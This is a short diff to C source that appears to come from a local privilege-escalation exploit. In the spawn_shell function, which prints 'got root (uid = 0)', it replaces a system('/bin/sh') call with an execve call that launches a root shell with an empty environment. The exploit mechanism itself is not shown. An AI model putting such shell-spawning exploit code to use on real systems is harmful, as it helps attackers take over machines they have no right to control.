@@ -11,8 +11,10 @@ void spawn_shell(void) {
     }
     puts("[+] got root (uid = 0)");
     puts("[ ] spawning shell");
-    system("/bin/sh");
-    exit(0);
+    char *argv[] = {"/bin/sh", NULL};
+    char *envp[] = {NULL};
+    execve("/bin/sh", argv, envp);
+    exit(EXIT_SUCCESS);
 }
 
 void save_state(void) {
